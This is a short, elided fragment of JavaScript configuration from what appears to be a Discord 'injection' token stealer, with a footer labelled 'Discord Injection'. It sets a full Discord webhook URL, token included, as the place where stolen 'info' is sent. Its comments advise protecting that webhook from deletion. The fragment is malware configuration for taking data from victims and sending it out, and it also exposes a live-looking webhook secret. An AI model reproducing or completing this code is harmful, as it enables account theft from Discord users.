...
const config = {
  hook: 'https://discord.com/api/webhooks/1064625534555922503/1suZ0qyidnCWIWs5lAuvV3oR4iAG8I8OfisLEfam57JaVgsfdDCTf4Gws4h1ZhFwPXOz', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
  ...
  embed_icon: 'https://cdn.discordapp.com/attachments/957735350535585885/1065482409455394938/7aa9d65b77b7beb6db9fdbffdad1892e1.gif'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
    ...
    embeds: [
      {
        ...
        footer: {
          text: ':syringe: ・Discord Injection ',
        },
      },
    ],
  };
